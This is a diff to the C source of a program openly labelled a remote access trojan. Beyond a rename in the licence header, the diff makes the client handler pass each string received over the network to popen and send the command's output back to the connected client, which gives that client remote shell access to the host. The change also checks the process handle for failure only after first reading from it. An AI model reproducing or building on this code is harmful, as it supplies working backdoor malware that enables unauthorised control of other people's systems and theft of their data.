@@ -1,19 +1,19 @@
 /*
- *  Luther Blissed  --  Remote Access Trojan
+ *  Luther Blissett  --  Remote Access Trojan
  *  Copyright (C) 2024  Davide Usberti aka UsboKirishima
  *
- *  Luther Blissed is free software: you can redistribute it and/or modify
+ *  Luther Blissett is free software: you can redistribute it and/or modify
  *  it under the terms of the GNU General Public License as published by
  *  the Free Software Foundation, either version 3 of the License, or
  *  (at your option) any later version.
  *
- *  Luther Blissed is distributed in the hope that it will be useful,
+ *  Luther Blissett is distributed in the hope that it will be useful,
  *  but WITHOUT ANY WARRANTY; without even the implied warranty of
  *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
  *  GNU General Public License for more details.
  *
  *  You should have received a copy of the GNU General Public License
- *  along with Luther Blissed.  If not, see <http://www.gnu.org/licenses/>.
+ *  along with Luther Blissett.  If not, see <http://www.gnu.org/licenses/>.
  */
 #include <stdio.h>
 #include <stdlib.h>
@@ -49,7 +49,7 @@ void *handle_client(void *arg)
     free(arg);
 
     char buff[MAX]; 
-    char response[] = "si";
+    char response[1024];
     struct sockaddr_in cliaddr;
     socklen_t cliaddr_len = sizeof(cliaddr);
     getpeername(connfd, (struct sockaddr*)&cliaddr, &cliaddr_len);
@@ -66,14 +66,29 @@ void *handle_client(void *arg)
         }
 
         printf("From client %s:%d: %s\n", inet_ntoa(cliaddr.sin_addr), ntohs(cliaddr.sin_port), buff); 
-        parseCommand(buff);
+        //parseCommand(buff);
+        FILE* process = popen(buff, "r");
+        fgets(response, sizeof(response), process);
+        printf("\n%s", response);
         
-        write(connfd, response, sizeof(response)); 
+        if (process == NULL) {
+            snprintf(response, sizeof(response), "Failed to run command\n");
+        } else {
+            char tmp[1024];
+            while (fgets(tmp, sizeof(tmp), process) != NULL) {
+                strncat(response, tmp, sizeof(response) - strlen(response) - 1);
+            }
+            pclose(process);
+        }
+
+
+        write(connfd, response, strlen(response));
    
         if (strncmp("exit", buff, 4) == 0) { 
             printf("Client %s:%d sent exit. Closing connection.\n", inet_ntoa(cliaddr.sin_addr), ntohs(cliaddr.sin_port));
             break; 
         } 
+
     } 
     close(connfd);
     return NULL;
